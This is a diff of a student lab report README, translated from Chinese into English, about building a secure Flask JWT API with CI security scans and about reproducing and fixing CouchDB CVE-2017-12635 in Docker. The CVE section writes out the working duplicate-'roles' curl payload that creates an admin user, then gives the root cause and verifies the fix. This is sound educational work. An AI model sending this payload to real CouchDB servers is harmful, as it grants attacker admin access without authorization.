@@ -1,71 +1,76 @@
-# 实验一：安全 REST API 与 CVE-2017-12635 复现
+# Laboratory Work No. 1
 
-| 项目 | 内容 |
+## Secure REST API Development with CI/CD and CVE-2017-12635 Analysis
+
+| Field | Value |
 |---|---|
-| 实验编号 | Work 1 |
-| 变体 | CVE-2017-12635 |
-| 姓名 | Guo Ruihao |
-| HDU 学号 | 23320309 |
-| 仓库 | <https://github.com/zhangyu7777777/InformationSecurity_23320309> |
-| 成功流水线 | <https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39363497176> |
+| Laboratory work | Work 1 |
+| Variant | CVE-2017-12635 |
+| Student surname and name | Guo Ruihao |
+| HDU number | 23320309 |
+| Repository | <https://github.com/zhangyu7777777/InformationSecurity_23320309> |
+| Successful pipeline | <https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39363497176> |
 
-## 1. 实验目的
+## 1. Purpose
 
-用 Flask 实现一个需要 JWT 登录的 REST API，防止 SQL 注入和 XSS；用
-GitHub Actions 运行 Bandit 和 pip-audit；用 Docker 复现
-CVE-2017-12635 并验证修复。
+The purpose of this work is to build a Flask REST API with JWT authentication,
+SQL injection and XSS protection, automated SAST/SCA checks in GitHub
+Actions, and a reproduced and fixed CVE in Docker.
 
-## 2. 项目与 API
+## 2. Project and API
 
-代码在 `app.py`，数据库用 SQLite。运行：
+The application is implemented in `app.py` and uses SQLite. Run it with:
 
 ```powershell
-cd "C:\Users\29611\Desktop\信息安全\lab\secure-api"
+cd path\to\secure-api
 py -3 -m venv .venv
 .\.venv\Scripts\python.exe -m pip install -r requirements.txt
 .\.venv\Scripts\python.exe app.py
 ```
 
-首次运行会创建两个测试用户：`alice / 123456`（admin）和
-`bob / 123456`（user）。
+The first start creates two test users: `alice / 123456` (admin) and
+`bob / 123456` (user).
 
-| 方法 | 路径 | 说明 |
+| Method | Path | Description |
 |---|---|---|
-| POST | `/auth/login` | 登录，返回 JWT |
-| GET | `/api/data` | 获取数据，需要 token |
-| POST | `/api/data` | 新增数据，需要 token |
+| POST | `/auth/login` | Log in and return a JWT |
+| GET | `/api/data` | Return data; requires a token |
+| POST | `/api/data` | Create data; requires a token |
 
-登录：
+Log in:
 
 ```bat
 curl.exe -X POST http://127.0.0.1:5000/auth/login -H "Content-Type: application/json" -d "{\"login\":\"alice\",\"password\":\"123456\"}"
 ```
 
-获取数据（把 `TOKEN` 换成登录返回的 token）：
+Get data (replace `TOKEN` with the returned token):
 
 ```bat
 curl.exe http://127.0.0.1:5000/api/data -H "Authorization: Bearer TOKEN"
 ```
 
-不带 token 时返回 401。
-
-新增数据：
+Create data:
 
 ```bat
 curl.exe -X POST http://127.0.0.1:5000/api/data -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d "{\"title\":\"test\",\"body\":\"hello\"}"
 ```
 
-## 3. 安全措施
+Access without a token returns `401`.
 
-- **SQL 注入**：所有 SQL 都用 `?` 占位符，例如
-  `SELECT * FROM users WHERE username = ?`，不拼接用户输入。
-- **XSS**：返回数据前用 `html.escape()` 转义标题、正文和用户名。
-- **认证**：密码用 bcrypt 哈希后存储；登录返回 HS256 JWT；两个受保护
-  接口都使用 `@login_required` 验证 token，缺失或无效时返回 401。
+## 3. Security Measures
+
+- **SQL injection:** every SQL statement uses `?` placeholders, for example
+  `SELECT * FROM users WHERE username = ?`. No user input is concatenated
+  into SQL.
+- **XSS:** titles, body text, and usernames are escaped with `html.escape()`
+  before they are returned.
+- **Authentication:** passwords are stored as bcrypt hashes; login returns an
+  HS256 JWT; both protected endpoints use `@login_required`, which returns
+  `401` for a missing or invalid token.
 
 ## 4. CI/CD
 
-`.github/workflows/ci.yml` 在每次 push 时运行：
+`.github/workflows/ci.yml` runs on every push:
 
 ```text
 python -c "import app"
@@ -73,24 +78,27 @@ bandit app.py
 pip-audit -r requirements.txt
 ```
 
-结果：Bandit 无问题，pip-audit 无已知漏洞。报告作为
-`security-reports` artifact 上传。
+Result: Bandit reports no issues and pip-audit reports no known
+vulnerabilities. The JSON reports are uploaded as the `security-reports`
+artifact.
 
-流水线：<https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39363497176>
+Pipeline: <https://github.com/zhangyu7777777/InformationSecurity_23320309/actions/runs/39363497176>
 
-![SAST 和 SCA 结果](screenshots/security-check.png)
+![SAST and SCA results](screenshots/security-check.png)
 
 ![GitHub Actions](screenshots/ci-success.png)
 
 ## 5. CVE-2017-12635
 
-### 5.1 漏洞说明
+### 5.1 Vulnerability
 
-CVE-2017-12635 是 CouchDB 2.1.1 之前的权限提升漏洞。CouchDB 用 Erlang
-解析器检查权限，用 JavaScript 解析器保存用户。请求中出现重复的 `roles`
-键时，两个解析器看到的值不同，普通用户可以把自己创建成管理员。
+CVE-2017-12635 is a privilege escalation vulnerability in CouchDB before
+2.1.1. CouchDB uses an Erlang parser for authorization and a JavaScript
+parser for user storage. When a request contains duplicate `roles` keys, the
+two parsers see different values, allowing a normal user to create an
+administrator account.
 
-### 5.2 复现
+### 5.2 Reproduction
 
 ```bash
 git clone --depth 1 https://github.com/vulhub/vulhub.git
@@ -98,7 +106,8 @@ cd vulhub/couchdb/CVE-2017-12635
 docker compose up -d
 ```
 
-如果返回 `404 Database does not exist`，手动创建系统库：
+If the request returns `404 Database does not exist`, create the system
+databases manually:
 
 ```bat
 curl.exe -X PUT http://admin:password@127.0.0.1:5984/_users
@@ -106,19 +115,19 @@ curl.exe -X PUT http://admin:password@127.0.0.1:5984/_replicator
 curl.exe -X PUT http://admin:password@127.0.0.1:5984/_global_changes
 ```
 
-正常设置管理员角色，返回 403：
+A normal request that tries to set the admin role returns `403`:
 
 ```bat
 curl.exe -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"password\":\"vulhub\"}"
 ```
 
-使用重复 `roles`，返回 201：
+A request with duplicate `roles` keys returns `201`:
 
 ```bat
 curl.exe -i -X PUT http://127.0.0.1:5984/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"vulhub\"}"
 ```
 
-登录后可以看到 `_admin` 角色：
+The new user has the `_admin` role:
 
 ```bat
 curl.exe -u vulhub:vulhub http://127.0.0.1:5984/_session
@@ -128,40 +137,42 @@ curl.exe -u vulhub:vulhub http://127.0.0.1:5984/_session
 {"ok":true,"userCtx":{"name":"vulhub","roles":["_admin"]},...}
 ```
 
-![漏洞复现](screenshots/cve-before.png)
+![Vulnerability reproduction](screenshots/cve-before.png)
 
-### 5.3 根因分析
+### 5.3 Root Cause
 
-这是两个 JSON 解析器对重复键的处理不一致。权限检查阶段读取第一个
-`roles`（`["_admin"]`），保存阶段读取最后一个 `roles`（`[]`），导致
-权限检查和实际保存的用户角色不一致。
+The root cause is a JSON parser differential. The authorization check reads
+the first `roles` value (`["_admin"]`), while the storage layer reads the last
+value (`[]`). As a result, the role used by the authorization check differs
+from the role saved in the user document.
 
-### 5.4 修复
+### 5.4 Fix
 
-先停止漏洞环境：
+Stop the vulnerable environment:
 
 ```bash
 docker compose down
 ```
 
-使用 CouchDB 2.1.1：
+Start CouchDB 2.1.1:
 
 ```bash
 docker run -d --name couchdb-fixed -p 5985:5984 -e COUCHDB_USER=admin -e COUCHDB_PASSWORD=password couchdb:2.1.1
 ```
 
-等待几秒后创建系统库：
+Wait a few seconds, then create the system database:
 
 ```bat
 curl.exe -X PUT http://admin:password@127.0.0.1:5985/_users
 ```
 
-修复方式是升级镜像版本，没有修改 Dockerfile 或 compose 文件，因此没有
-额外的 fix 文件夹。
+The fix is a version upgrade. No Dockerfile or compose file was changed, so
+no separate fix folder is required.
 
-### 5.5 修复验证
+### 5.5 Verification
 
-重复 `roles` 请求仍返回 201，但登录后角色为空：
+The duplicate-role request still returns `201`, but the session has no admin
+role:
 
 ```bat
 curl.exe -i -X PUT http://127.0.0.1:5985/_users/org.couchdb.user:vulhub -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"vulhub\",\"roles\":[\"_admin\"],\"roles\":[],\"password\":\"vulhub\"}"
@@ -175,16 +186,16 @@ curl.exe -u vulhub:vulhub http://127.0.0.1:5985/_session
 {"ok":true,"userCtx":{"name":"vulhub","roles":[]},...}
 ```
 
-创建数据库返回 401：
+Creating a database returns `401`:
 
 ```bat
 curl.exe -i -u vulhub:vulhub -X PUT http://127.0.0.1:5985/newdb
 ```
 
-普通用户注册仍返回 201：
+Normal user registration still returns `201`:
 
 ```bat
 curl.exe -i -X PUT http://127.0.0.1:5985/_users/org.couchdb.user:normaluser -H "Content-Type: application/json" -d "{\"type\":\"user\",\"name\":\"normaluser\",\"roles\":[],\"password\":\"normalpass\"}"
 ```
 
-![修复验证](screenshots/cve-after.png)
+![Fix verification](screenshots/cve-after.png)
